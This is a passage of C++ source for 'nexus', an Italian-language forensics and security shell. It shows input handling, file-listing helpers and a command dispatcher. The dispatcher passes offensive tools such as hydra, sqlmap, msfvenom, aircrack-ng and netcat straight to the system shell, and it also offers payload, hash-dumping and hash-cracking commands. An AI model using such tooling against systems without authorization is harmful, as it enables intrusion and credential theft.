                 <<"    filescan   — file aperti\n"
                 <<"    dlllist    — DLL caricate\n"
                 <<"    hashdump   — hash password\n"
                 <<"    malfind    — cerca codice iniettato\n"
                 <<Color::RESET; return;
    }
    std::string dump=args[1];
    std::string plugin=(args.size()>=3)?args[2]:"pslist";

    std::cout<<Color::CYAN<<"\n  VOLATILITY: "<<dump<<" ["<<plugin<<"]\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(55,'-')<<"\n"<<Color::RESET;

    // Prova vol3 prima, poi vol2
    FILE* test=popen("which vol3 2>/dev/null","r");
    char tbuf[64]={0}; fgets(tbuf,sizeof(tbuf),test); pclose(test);
    std::string volCmd;
    if(strlen(tbuf)>2) volCmd="vol3 -f "+dump+" windows."+plugin;
    else {
        FILE* t2=popen("which vol2 2>/dev/null","r");
        char t2buf[64]={0}; fgets(t2buf,sizeof(t2buf),t2); pclose(t2);
        if(strlen(t2buf)>2) volCmd="vol2 --plugins="+plugin+" -f "+dump;
        else {
            std::cout<<Color::RED<<"  Volatility non trovato.\n"<<Color::RESET;
            std::cout<<Color::DIM<<"  Installa con: nex install volatility\n\n"<<Color::RESET;
            // Fallback: usa il nostro cmdMemory
            std::cout<<Color::YELLOW<<"  Uso analisi interna (memory):\n"<<Color::RESET;
            std::vector<std::string> memArgs={"memory",dump,"--all"};
            cmdMemory(memArgs);
            return;
        }
    }
    runShellCmd(volCmd);
}

#include <termios.h>

// ─────────────────────────────────────────────
//  INPUT — readline con frecce e TAB
// ─────────────────────────────────────────────
static std::vector<std::string> g_inputHistory;
static int g_histPos = -1;

// Lista comandi per TAB completion
static const std::vector<std::string> ALL_CMDS = {
    "help","clear","exit","quit","hash","fileinfo","hexdump","strings","grep","magic",
    "entropy","binwalk","carve","checksum","exif","stego","diff","compare",
    "freport","custody","hashdb","diskimage","memory","registry",
    "scan","timeline","timeline2","filehide","permcheck","report","logcheck",
    "sysinfo","sysaudit","processes","openports","filetree","duplicates","bigfiles",
    "decode","encode","enc","hashid","hashcrack","passcheck","randgen",
    "xor","jwt","cipher","freq","timestamp","wordgen","calc","note","notes","alias",
    "dns","dnsall","dnsenum","whois","ping","traceroute","portcheck","portscan",
    "httphead","secheaders","banner","hostinfo","ssl","sslscan2","subnet","macinfo",
    "urlparse","netstat","netcap","arpscan","geoip2","myip","speedtest","monitor",
    "git","nex","vol",
    "ls","cd","pwd","cat","mkdir","rm","mv","cp","touch","find","wc","head","tail",
    "echo","env","which","chmod","df","du","uname","whoami","date","uptime",
    "sort","uniq","cut","man","history","python3","pip","pip3","sh","run",
    "nmap","curl","wget","openssl","ssh","docker","node","npm","hydra",
    "hashcat","john","sqlmap","nikto","gobuster","ffuf"
};

std::string nexusReadLine(const std::string& prompt) {
    std::cout << prompt << std::flush;

    // Imposta terminal raw mode
    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    newt.c_cc[VMIN] = 1;
    newt.c_cc[VTIME] = 0;
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    std::string line;
    int cursor = 0;
    g_histPos = -1;
    std::string savedLine;

    auto redraw = [&](){
        // Cancella riga corrente e riscrivi dall'inizio
        std::cout << "\033[2K\r" << prompt << line;
        // Riposiziona cursore se non alla fine
        int backSteps = (int)line.size() - cursor;
        if(backSteps > 0)
            std::cout << "\033[" << backSteps << "D";
        std::cout << std::flush;
    };

    while(true) {
        char c;
        if(read(STDIN_FILENO, &c, 1) != 1) break;

        if(c == '\n' || c == '\r') {
            std::cout << "\n";
            break;
        }
        else if(c == 127 || c == 8) { // Backspace
            if(cursor > 0) {
                line.erase(cursor-1, 1);
                cursor--;
                redraw();
            }
        }
        else if(c == '\t') { // TAB completion
            std::string prefix = line.substr(0, cursor);
            // Trova spazio — se è il primo token, completa comandi
            size_t spacePos = prefix.find(' ');
            std::vector<std::string> matches;
            if(spacePos == std::string::npos) {
                // Completa comando
                for(auto& cmd : ALL_CMDS)
                    if(cmd.substr(0, prefix.size()) == prefix) matches.push_back(cmd);
            } else {
                // Completa file/dir
                std::string partial = prefix.substr(spacePos+1);
                std::string dirPart = ".";
                std::string filePart = partial;
                size_t lastSlash = partial.rfind('/');
                if(lastSlash != std::string::npos) {
                    dirPart = partial.substr(0, lastSlash);
                    filePart = partial.substr(lastSlash+1);
                }
                DIR* d = opendir(dirPart.c_str());
                if(d) {
                    struct dirent* ent;
                    while((ent=readdir(d))!=nullptr) {
                        std::string n=ent->d_name;
                        if(n=="."||n=="..") continue;
                        if(n.substr(0,filePart.size())==filePart)
                            matches.push_back((dirPart=="."?"":dirPart+"/")+n);
                    }
                    closedir(d);
                }
            }
            if(matches.size()==1) {
                std::string completion = matches[0];
                if(spacePos==std::string::npos) { line=completion; cursor=line.size(); }
                else {
                    size_t wordStart = line.rfind(' ',cursor-1)+1;
                    line = line.substr(0,wordStart)+completion;
                    cursor = line.size();
                }
                redraw();
            } else if(matches.size()>1) {
                std::cout << "\n";
                for(auto& m:matches) std::cout<<"  "<<m<<"  ";
                std::cout << "\n";
                std::cout << prompt << line << std::flush;
            }
        }
        else if(c == '\033') { // Escape sequence
            char seq[3]={0};
            if(read(STDIN_FILENO,&seq[0],1)!=1) continue;
            if(read(STDIN_FILENO,&seq[1],1)!=1) continue;
            if(seq[0]=='[') {
                if(seq[1]=='A') { // Su — history precedente
                    if(g_histPos==-1) { savedLine=line; g_histPos=(int)g_inputHistory.size()-1; }
                    else if(g_histPos>0) g_histPos--;
                    if(g_histPos>=0&&g_histPos<(int)g_inputHistory.size()) {
                        line=g_inputHistory[g_histPos]; cursor=line.size(); redraw();
                    }
                } else if(seq[1]=='B') { // Giu — history successiva
                    if(g_histPos>=0) {
                        g_histPos++;
                        if(g_histPos>=(int)g_inputHistory.size()) {
                            g_histPos=-1; line=savedLine;
                        } else { line=g_inputHistory[g_histPos]; }
                        cursor=line.size(); redraw();
                    }
                } else if(seq[1]=='C') { // Destra
                    if(cursor<(int)line.size()) { cursor++; std::cout<<"\033[1C"<<std::flush; }
                } else if(seq[1]=='D') { // Sinistra
                    if(cursor>0) { cursor--; std::cout<<"\033[1D"<<std::flush; }
                } else if(seq[1]=='H' || seq[1]=='1') { // Home
                    cursor=0; redraw();
                } else if(seq[1]=='F' || seq[1]=='4') { // End
                    cursor=line.size(); redraw();
                }
            }
        }
        else if(c>=32 && c<127) { // Carattere normale
            line.insert(cursor, 1, c);
            cursor++;
            redraw();
        }
        else if(c==3) { // Ctrl+C
            line=""; std::cout<<"\n"; break;
        }
        else if(c==4) { // Ctrl+D
            if(line.empty()) { line="exit"; std::cout<<"\n"; break; }
        }
        else if(c==1) { // Ctrl+A — inizio riga
            cursor=0; redraw();
        }
        else if(c==5) { // Ctrl+E — fine riga
            cursor=line.size(); redraw();
        }
        else if(c==11) { // Ctrl+K — cancella fino a fine riga
            line=line.substr(0,cursor); redraw();
        }
        else if(c==21) { // Ctrl+U — cancella tutta la riga
            line=""; cursor=0; redraw();
        }
    }

    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    return line;
}

// ─────────────────────────────────────────────
//  SHELL — helper generico esegui comando
// ─────────────────────────────────────────────
void runShellCmd(const std::string& cmd) {
    std::cout << Color::DIM << "  $ " << cmd << "\n" << Color::RESET;
    FILE* p = popen((cmd + " 2>&1").c_str(), "r");
    if (!p) { std::cout << Color::RED << "  Errore esecuzione.\n" << Color::RESET; return; }
    char buf[512];
    while (fgets(buf, sizeof(buf), p))
        std::cout << Color::WHITE << "  " << buf << Color::RESET;
    pclose(p);
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: ls
// ─────────────────────────────────────────────
void cmdLs(const std::vector<std::string>& args) {
    std::string flags = "", dir = ".";
    for (size_t i = 1; i < args.size(); i++) {
        if (args[i][0] == '-') flags += " " + args[i];
        else dir = args[i];
    }
#ifdef __APPLE__
    std::string cmd = "ls -G" + flags + " " + dir;
#else
    std::string cmd = "ls --color=always" + flags + " " + dir;
#endif
    // Output colorato manuale come fallback
    DIR* d = opendir(dir.c_str());
    if (!d) { runShellCmd(cmd); return; }

    bool longFmt = flags.find('l') != std::string::npos;
    bool showAll = flags.find('a') != std::string::npos;

    std::cout << Color::CYAN << "\n  📁 " << dir << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55, '-') << "\n" << Color::RESET;

    std::vector<std::string> entries;
    struct dirent* ent;
    while ((ent = readdir(d)) != nullptr) {
        std::string name = ent->d_name;
        if (!showAll && name[0] == '.') continue;
        entries.push_back(name);
    }
    closedir(d);
    std::sort(entries.begin(), entries.end());

    for (auto& name : entries) {
        std::string full = (dir == "." ? "" : dir + "/") + name;
        struct stat st;
        bool ok = (stat(full.c_str(), &st) == 0);
        std::string col;
        if (!ok)                   col = Color::WHITE;
        else if (S_ISDIR(st.st_mode))  col = Color::BCYAN;
        else if (st.st_mode & S_IXUSR) col = Color::BGREEN;
        else if (name[0] == '.')       col = Color::DIM;
        else                           col = Color::WHITE;

        if (longFmt && ok) {
            std::cout << Color::DIM << "  " << permString(st.st_mode)
                      << "  " << std::setw(8) << humanSize(st.st_size)
                      << "  " << Color::RESET << col << name << Color::RESET << "\n";
        } else {
            std::cout << "  " << col << name << Color::RESET << "\n";
        }
    }
    std::cout << Color::DIM << "\n  " << entries.size() << " elementi\n" << Color::RESET << "\n";
}

// ─────────────────────────────────────────────
//  CMD: cd
// ─────────────────────────────────────────────
void cmdCd(const std::vector<std::string>& args) {
    std::string dest = (args.size() >= 2) ? args[1] : (getenv("HOME") ? getenv("HOME") : ".");
    if (chdir(dest.c_str()) != 0)
        std::cout << Color::RED << "  cd: " << dest << ": " << strerror(errno) << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: cat
// ─────────────────────────────────────────────
void cmdCat(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: cat <file>\n" << Color::RESET; return; }
    std::ifstream f(args[1]);
    if (!f) { std::cout << Color::RED << "  cat: " << args[1] << ": file non trovato\n" << Color::RESET; return; }
    std::cout << "\n";
    std::string line; int n = 0;
    while (std::getline(f, line)) {
        std::cout << Color::DIM << std::setw(4) << ++n << "  " << Color::WHITE << line << Color::RESET << "\n";
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: find
// ─────────────────────────────────────────────
void cmdFind(const std::vector<std::string>& args) {
    if (args.size() < 3) { std::cout << Color::YELLOW << "Uso: find <dir> <pattern>\n" << Color::RESET; return; }
    std::string dir = args[1], pat = args[2];
    std::cout << Color::CYAN << "\n  🔍 FIND: " << pat << " in " << dir << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55, '-') << "\n" << Color::RESET;
    std::function<void(const std::string&)> walk = [&](const std::string& d) {
        DIR* dp = opendir(d.c_str()); if (!dp) return;
        struct dirent* e;
        while ((e = readdir(dp)) != nullptr) {
            std::string name = e->d_name;
            if (name == "." || name == "..") continue;
            std::string full = d + "/" + name;
            if (toLower(name).find(toLower(pat)) != std::string::npos)
                std::cout << Color::GREEN << "  " << full << Color::RESET << "\n";
            struct stat st;
            if (stat(full.c_str(), &st) == 0 && S_ISDIR(st.st_mode))
                walk(full);
        }
        closedir(dp);
    };
    walk(dir);
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: wc
// ─────────────────────────────────────────────
void cmdWc(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: wc <file>\n" << Color::RESET; return; }
    std::ifstream f(args[1]);
    if (!f) { std::cout << Color::RED << "  wc: file non trovato\n" << Color::RESET; return; }
    size_t lines=0, words=0, bytes=0;
    std::string line;
    while (std::getline(f, line)) {
        lines++; bytes += line.size() + 1;
        std::istringstream ss(line); std::string w;
        while (ss >> w) words++;
    }
    std::cout << Color::CYAN << "\n  📊 WC: " << args[1] << "\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Righe : " << Color::WHITE << lines << "\n";
    std::cout << Color::YELLOW << "  Parole: " << Color::WHITE << words << "\n";
    std::cout << Color::YELLOW << "  Byte  : " << Color::WHITE << bytes << "\n\n" << Color::RESET;
}

// ─────────────────────────────────────────────
//  CMD: head / tail
// ─────────────────────────────────────────────
void cmdHead(const std::vector<std::string>& args, bool tail = false) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: " << args[0] << " <file> [n]\n" << Color::RESET; return; }
    int n = (args.size() >= 3) ? std::stoi(args[2]) : 10;
    std::ifstream f(args[1]);
    if (!f) { std::cout << Color::RED << "  File non trovato.\n" << Color::RESET; return; }
    std::vector<std::string> lines;
    std::string line;
    while (std::getline(f, line)) lines.push_back(line);
    std::cout << Color::CYAN << "\n  " << (tail?"🔚 TAIL":"🔝 HEAD") << ": " << args[1] << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
    size_t start = tail ? (lines.size() > (size_t)n ? lines.size()-n : 0) : 0;
    size_t end   = tail ? lines.size() : std::min((size_t)n, lines.size());
    for (size_t i = start; i < end; i++)
        std::cout << Color::DIM << "  " << std::setw(4) << i+1 << "  " << Color::WHITE << lines[i] << Color::RESET << "\n";
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: history — storico sessione corrente
// ─────────────────────────────────────────────
static std::vector<std::string> g_history;

void cmdHistory() {
    std::cout << Color::CYAN << "\n  📜 HISTORY\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
    for (size_t i = 0; i < g_history.size(); i++)
        std::cout << Color::DIM << "  " << std::setw(4) << i+1 << "  " << Color::WHITE << g_history[i] << Color::RESET << "\n";
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: python3 / pip / pip3
// ─────────────────────────────────────────────
void cmdPython(const std::vector<std::string>& args) {
    // Ricostruisce il comando completo
    std::string cmd = "python3";
    for (size_t i = 1; i < args.size(); i++) cmd += " " + args[i];
    std::cout << Color::CYAN << "\n  🐍 PYTHON3\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
    runShellCmd(cmd);
}

void cmdPip(const std::vector<std::string>& args) {
    std::string base = (args[0] == "pip3") ? "pip3" : "pip3";
    std::string cmd = base;
    for (size_t i = 1; i < args.size(); i++) cmd += " " + args[i];
    std::cout << Color::CYAN << "\n  📦 PIP\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
    runShellCmd(cmd);
}

// ─────────────────────────────────────────────
//  CMD: run — esegui qualsiasi comando di sistema
// ─────────────────────────────────────────────
void cmdRun(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: run <comando> [args...]\n" << Color::RESET; return; }
    std::string cmd;
    for (size_t i = 1; i < args.size(); i++) { if (i > 1) cmd += " "; cmd += args[i]; }
    runShellCmd(cmd);
}

// ─────────────────────────────────────────────
//  CMD: sh — esegui script shell
// ─────────────────────────────────────────────
void cmdSh(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: sh <script.sh>\n" << Color::RESET; return; }
    std::string cmd = "sh";
    for (size_t i = 1; i < args.size(); i++) cmd += " " + args[i];
    std::cout << Color::CYAN << "\n  🐚 SHELL\n" << Color::RESET;
    runShellCmd(cmd);
}


// ─────────────────────────────────────────────
//  PROMPT
// ─────────────────────────────────────────────
std::string getPrompt() {
    char cwd[512];
    if (!getcwd(cwd, sizeof(cwd))) strncpy(cwd, "/", sizeof(cwd));
    std::string user = getenv("USER") ? getenv("USER") : "nexus";
    char hostname[64];
    gethostname(hostname, sizeof(hostname));

    // Abbrevia il path home con ~
    std::string path = cwd;
    const char* home = getenv("HOME");
    if (home && path.find(home) == 0)
        path = "~" + path.substr(strlen(home));

    std::string line1 = Color::CYAN + "╭─[" + Color::BRED + "nexus" 
                      + Color::WHITE + "@" + Color::BYELLOW + user
                      + Color::CYAN + "]─[" + Color::WHITE + path
                      + Color::CYAN + "]" + Color::RESET;

    std::string arrow = (user == "root") ? Color::BRED + "# " : Color::BGREEN + "$ ";

    std::string line2 = Color::CYAN + "╰─" + arrow + Color::RESET;

    return "\n" + line1 + "\n" + line2;
}

// ─────────────────────────────────────────────
//  MAIN LOOP
// ─────────────────────────────────────────────
int main() {
    printBanner();
    std::cout << Color::DIM
              << "  ┌─────────────────────────────────────────────────────────┐\n"
              << "  │  ⚠️  Questo tool è destinato esclusivamente a scopi      │\n"
              << "  │     educativi e di analisi forense autorizzata.          │\n"
              << "  │     Usa i comandi in modo responsabile e legale.         │\n"
              << "  │                                                          │\n"
              << "  │     Digita  " << Color::BYELLOW << "help" << Color::DIM << "  per la lista dei comandi.           │\n"
              << "  └─────────────────────────────────────────────────────────┘\n"
              << Color::RESET << "\n";

    std::string line;
    while (true) {
        line = nexusReadLine(getPrompt());
        line = trim(line);
        if (line.empty()) continue;

        // Salva in history (evita duplicati consecutivi)
        if(g_inputHistory.empty() || g_inputHistory.back() != line)
            g_inputHistory.push_back(line);
        g_history.push_back(line);

        // Espandi alias
        auto tokens2 = split(line);
        if(!tokens2.empty() && g_aliases.count(tokens2[0])) {
            std::string expanded = g_aliases[tokens2[0]];
            for(size_t i=1;i<tokens2.size();i++) expanded += " "+tokens2[i];
            line = expanded;
        }

        auto tokens = split(line);
        std::string cmd = toLower(tokens[0]);
        g_history.push_back(line);

        try {
            if (cmd == "exit" || cmd == "quit") {
                std::cout << Color::CYAN << "\n  Arrivederci! Ricorda: ogni azione lascia traccia. 🔍\n\n" << Color::RESET;
                break;
            }
            else if (cmd == "clear")    { std::cout << "\033[2J\033[1;1H"; printBanner(); }
            else if (cmd == "help")     { cmdHelp(); }
            else if (cmd == "hash")     { cmdHash(tokens); }
            else if (cmd == "fileinfo") { cmdFileInfo(tokens); }
            else if (cmd == "hexdump")  { cmdHexdump(tokens); }
            else if (cmd == "strings")  { cmdStrings(tokens); }
            else if (cmd == "grep")     { cmdGrep(tokens); }
            else if (cmd == "magic")    { cmdMagic(tokens); }
            else if (cmd == "entropy")  { cmdEntropy(tokens); }
            else if (cmd == "scan")     { cmdScan(tokens); }
            else if (cmd == "timeline") { cmdTimeline(tokens); }
            else if (cmd == "compare")  { cmdCompare(tokens); }
            else if (cmd == "report")   { cmdReport(tokens); }
            else if (cmd == "decode")    { cmdDecode(tokens); }
            else if (cmd == "hashid")    { cmdHashId(tokens); }
            else if (cmd == "passcheck") { cmdPassCheck(tokens); }
            else if (cmd == "xor")       { cmdXor(tokens); }
            else if (cmd == "dns")       { cmdDns(tokens); }
            else if (cmd == "portcheck") { cmdPortCheck(tokens); }
            else if (cmd == "portscan")  { cmdPortScan(tokens); }
            else if (cmd == "httphead")  { cmdHttpHead(tokens); }
            else if (cmd == "binwalk")   { cmdBinwalk(tokens); }
            else if (cmd == "hostinfo")  { cmdHostInfo(tokens); }
            else if (cmd == "stego")     { cmdStego(tokens); }
            else if (cmd == "diff")      { cmdDiff(tokens); }
            else if (cmd == "logcheck")  { cmdLogCheck(tokens); }
            else if (cmd == "sysinfo")   { cmdSysInfo(tokens); }
            else if (cmd == "network")   { cmdNetwork(tokens); }
            else if (cmd == "encode")    { cmdEncode(tokens); }
            else if (cmd == "jwt")       { cmdJwt(tokens); }
            else if (cmd == "subnet")    { cmdSubnet(tokens); }
            else if (cmd == "banner")    { cmdBanner(tokens); }
            else if (cmd == "ssl")       { cmdSsl(tokens); }
            else if (cmd == "macinfo")   { cmdMacInfo(tokens); }
            else if (cmd == "urlparse")  { cmdUrlParse(tokens); }
            else if (cmd == "owasp")     { cmdOwasp(tokens); }
            else if (cmd == "cve")       { cmdCve(tokens); }
            else if (cmd == "payload")   { cmdPayload(tokens); }
            else if (cmd == "ctf")       { cmdCtf(tokens); }
            else if (cmd == "carve")     { cmdCarve(tokens); }
            else if (cmd == "memory")    { cmdMemory(tokens); }
            else if (cmd == "registry")  { cmdRegistry(tokens); }
            else if (cmd == "netcap")    { cmdNetcap(tokens); }
            else if (cmd == "custody")   { cmdCustody(tokens); }
            else if (cmd == "hashdb")    { cmdHashDb(tokens); }
            else if (cmd == "diskimage") { cmdDiskImage(tokens); }
            else if (cmd == "freport")   { cmdForensicReport(tokens); }
            else if (cmd == "wordgen")   { cmdWordGen(tokens); }
            else if (cmd == "git")        { cmdGit(tokens); }
            else if (cmd == "freq")       { cmdFreq(tokens); }
            else if (cmd == "cipher")     { cmdCipher(tokens); }
            else if (cmd == "ping")       { cmdPing(tokens); }
            else if (cmd == "traceroute") { cmdTraceroute(tokens); }
            else if (cmd == "whois")      { cmdWhois(tokens); }
            else if (cmd == "netstat")    { cmdNetstat(tokens); }
            else if (cmd == "processes")  { cmdProcesses(tokens); }
            else if (cmd == "checksum")   { cmdChecksum(tokens); }
            else if (cmd == "secheaders") { cmdSecHeaders(tokens); }
            else if (cmd == "arpscan")    { cmdArpScan(tokens); }
            else if (cmd == "openports")  { cmdOpenPorts(tokens); }
            else if (cmd == "dnsall")     { cmdDnsAll(tokens); }
            else if (cmd == "hashcrack")  { cmdHashCrack(tokens); }
            else if (cmd == "permcheck")  { cmdPermCheck(tokens); }
            else if (cmd == "filehide")   { cmdFileHide(tokens); }
            else if (cmd == "enc")        { cmdEncodeExtra(tokens); }
            else if (cmd == "timestamp")  { cmdTimestamp(tokens); }
            else if (cmd == "randgen")    { cmdRandGen(tokens); }
            else if (cmd == "sysaudit")   { cmdSysAudit(tokens); }
            else if (cmd == "exif")       { cmdExif(tokens); }
            else if (cmd == "myip")       { cmdMyIp(tokens); }
            else if (cmd == "geoip")      { cmdGeoIp(tokens); }
            else if (cmd == "speedtest")  { cmdSpeedtest(tokens); }
            else if (cmd == "monitor")    { cmdMonitor(tokens); }
            else if (cmd == "nex")        { cmdNex(tokens); }
            // ── Tool passthrough — eseguiti direttamente dal sistema ──
            else if (cmd == "nmap"      || cmd == "masscan"   || cmd == "zmap"      ||
                     cmd == "sqlmap"    || cmd == "nikto"     || cmd == "gobuster"  ||
                     cmd == "ffuf"      || cmd == "wfuzz"     || cmd == "hydra"     ||
                     cmd == "medusa"    || cmd == "patator"   || cmd == "crowbar"   ||
                     cmd == "hashcat"   || cmd == "john"      || cmd == "aircrack-ng"||
                     cmd == "binwalk"   || cmd == "foremost"  || cmd == "volatility"||
                     cmd == "exiftool"  || cmd == "steghide"  || cmd == "zsteg"     ||
                     cmd == "subfinder" || cmd == "amass"     || cmd == "dnsx"      ||
                     cmd == "httprobe"  || cmd == "shodan"    || cmd == "netcat"    ||
                     cmd == "nc"        || cmd == "socat"     || cmd == "tcpdump"   ||
                     cmd == "curl"      || cmd == "wget"      || cmd == "httpie"    ||
                     cmd == "node"      || cmd == "npm"       || cmd == "npx"       ||
                     cmd == "go"        || cmd == "rustc"     || cmd == "cargo"     ||
                     cmd == "docker"    || cmd == "tmux"      || cmd == "jq"        ||
                     cmd == "vim"       || cmd == "nano"      || cmd == "less"      ||
                     cmd == "awk"       || cmd == "sed"       || cmd == "tr"        ||
                     cmd == "base64"    || cmd == "xxd"                             ||
                     cmd == "file"      || cmd == "lsof"      || cmd == "strace"    ||
                     cmd == "ltrace"    || cmd == "gdb"       || cmd == "objdump"   ||
                     cmd == "readelf"   || cmd == "nm"        || cmd == "strip"     ||
                     cmd == "openssl"   || cmd == "ssh"       || cmd == "scp"       ||
                     cmd == "rsync"     || cmd == "tar"       || cmd == "zip"       ||
                     cmd == "unzip"     || cmd == "7z"        || cmd == "make"      ||
                     cmd == "gcc"       || cmd == "clang"     || cmd == "java"      ||
                     cmd == "ruby"      || cmd == "perl"      || cmd == "php"       ||
                     cmd == "msfconsole"|| cmd == "msfvenom"  || cmd == "searchsploit" ||
                     cmd == "airmon-ng" || cmd == "airodump-ng"|| cmd == "aireplay-ng" ||
                     cmd == "tshark"    || cmd == "tcpreplay" || cmd == "scapy"     ||
                     cmd == "dirbuster" || cmd == "dirb"      || cmd == "feroxbuster") {
                // Ricostruisce il comando completo e lo passa al sistema
                std::string fullcmd;
                for (size_t i = 0; i < tokens.size(); i++) {
                    if (i > 0) fullcmd += " ";
                    fullcmd += tokens[i];
                }
                runShellCmd(fullcmd);
            }
            else if (cmd == "filetree")   { cmdFileTree(tokens); }
            else if (cmd == "duplicates") { cmdDuplicates(tokens); }
            else if (cmd == "bigfiles")   { cmdBigFiles(tokens); }
            else if (cmd == "timeline2")  { cmdTimelineAdv(tokens); }
            else if (cmd == "sslscan2")   { cmdSslScan(tokens); }
            else if (cmd == "dnsenum")    { cmdDnsEnum(tokens); }
            else if (cmd == "geoip2")     { cmdGeoIpLite(tokens); }
            else if (cmd == "calc")       { cmdCalc(tokens); }
            else if (cmd == "note")       { cmdNote(tokens); }
            else if (cmd == "notes")      { cmdNote(tokens); }
            else if (cmd == "alias")      { cmdAlias(tokens); }
            else if (cmd == "vol")        { cmdVolatility(tokens); }
            else if (cmd == "ls")         { cmdLs(tokens); }
            else if (cmd == "cd")         { cmdCd(tokens); }
            else if (cmd == "pwd")        { char cwd[512]; if(getcwd(cwd,sizeof(cwd))) std::cout<<Color::CYAN<<"\n  "<<cwd<<Color::RESET<<"\n\n"; }
            else if (cmd == "cat")        { cmdCat(tokens); }
            else if (cmd == "mkdir")      { if(tokens.size()>1){if(mkdir(tokens[1].c_str(),0755)==0) std::cout<<Color::GREEN<<"  Creata: "<<tokens[1]<<Color::RESET<<"\n\n"; else std::cout<<Color::RED<<"  Errore: "<<strerror(errno)<<Color::RESET<<"\n\n";} }
            else if (cmd == "rm")         { std::string c="rm"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "mv")         { std::string c="mv"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "cp")         { std::string c="cp"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "touch")      { if(tokens.size()>1){std::ofstream f(tokens[1],std::ios::app);std::cout<<Color::GREEN<<"  Creato: "<<tokens[1]<<Color::RESET<<"\n\n";} }
            else if (cmd == "find")       { cmdFind(tokens); }
            else if (cmd == "wc")         { cmdWc(tokens); }
            else if (cmd == "head")       { cmdHead(tokens, false); }
            else if (cmd == "tail")       { cmdHead(tokens, true); }
            else if (cmd == "echo")       { for(size_t i=1;i<tokens.size();i++) std::cout<<(i>1?" ":"  ")<<tokens[i]; std::cout<<"\n\n"; }
            else if (cmd == "env")        { runShellCmd("env"); }
            else if (cmd == "which")      { if(tokens.size()>1) runShellCmd("which "+tokens[1]); }
            else if (cmd == "chmod")      { std::string c="chmod"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "chown")      { std::string c="chown"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "df")         { std::string c="df"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "du")         { std::string c="du"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "uname")      { std::string c="uname"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "whoami")     { runShellCmd("whoami"); }
            else if (cmd == "date")       { runShellCmd("date"); }
            else if (cmd == "uptime")     { runShellCmd("uptime"); }
            else if (cmd == "sort")       { std::string c="sort"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "uniq")       { std::string c="uniq"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "cut")        { std::string c="cut"; for(size_t i=1;i<tokens.size();i++) c+=" "+tokens[i]; runShellCmd(c); }
            else if (cmd == "man")        { if(tokens.size()>1) runShellCmd("man "+tokens[1]); }
            else if (cmd == "history")    { cmdHistory(); }
            else if (cmd == "python3" || cmd == "python") { cmdPython(tokens); }
            else if (cmd == "pip" || cmd == "pip3") { cmdPip(tokens); }
            else if (cmd == "sh")         { cmdSh(tokens); }
            else if (cmd == "run")        { cmdRun(tokens); }
            else {
                std::cout << Color::RED << "  Comando sconosciuto: '" << cmd
                          << "'. Digita 'help' per la lista comandi.\n" << Color::RESET;
            }
        } catch (const std::exception& e) {
            std::cout << Color::BRED << "  Errore: " << e.what() << Color::RESET << "\n";
        }
    }
    return 0;
}